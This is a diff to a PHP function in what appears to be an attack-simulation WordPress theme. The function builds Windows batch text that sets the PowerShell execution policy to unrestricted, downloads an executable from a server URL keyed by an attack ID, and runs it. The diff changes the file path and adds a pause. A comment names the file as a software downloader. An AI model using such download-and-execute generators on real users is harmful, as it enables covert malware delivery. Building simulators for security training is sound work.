@@ -207,9 +207,9 @@ function get_windows_soft_text($attack_id, $text){
         //powershell set-executionpolicy unrestricted
         $text .= "powershell set-executionpolicy unrestricted" . WINDOWS_BREAK; //WE REPEAT IT IN CASE THE USER HAS CHANGED THE POLICY IN OTHER CMD
         foreach($software as $s){
-            //powershell -Command "$webclient = New-Object System.Net.WebClient;$url = 'http://localhost/wordpress/wp-content/themes/AttackSimulatorP/twenty-fifteen-child/handle-get.php?attack_id=3';$file = '%cd%\My_file.exe';$webclient.DownloadFile($url,$file)"
-            $text .= "powershell -Command \"\$webclient = New-Object System.Net.WebClient;\$url = '" . DOWNLOAD_FILE_FULL_LINK . $attack_id . "';\$file = '%cd%" . $s->file_name . "';\$webclient.DownloadFile(\$url,\$file)\"" . WINDOWS_BREAK;
-            $text .= "CALL \"" . $s->file_name . "\"";
+            //powershell -Command "$webclient = New-Object System.Net.WebClient;$url = 'http://localhost/wordpress/wp-content/themes/AttackSimulatorP/twenty-fifteen-child/handle-get.php?attack_id=3';$file='%cd%\CyberLink_PowerDirector_Downloader.exe';$webclient.DownloadFile($url,$file)"
+            $text .= "powershell -Command \"\$webclient = New-Object System.Net.WebClient;\$url = '" . DOWNLOAD_FILE_FULL_LINK . $attack_id . "';\$file='%~dp0\\" . $s->file_name . "';\$webclient.DownloadFile(\$url,\$file)\"" . WINDOWS_BREAK;
+            $text .= "CALL \"%~dp0\\" . $s->file_name . "\"";
             $length -= 1;
             if($length > 0)
                 $text .= WINDOWS_BREAK;
@@ -228,7 +228,7 @@ function get_windows_attack_text($win_attacks){
         $text = get_windows_files_text($a->id, $text);
         $text = get_windows_soft_text($a->id, $text);
     }
-    $text .= WINDOWS_BREAK . "exit";
+    $text .= WINDOWS_BREAK . "pause" . WINDOWS_BREAK . "exit";
     return $text;
 }
 /**
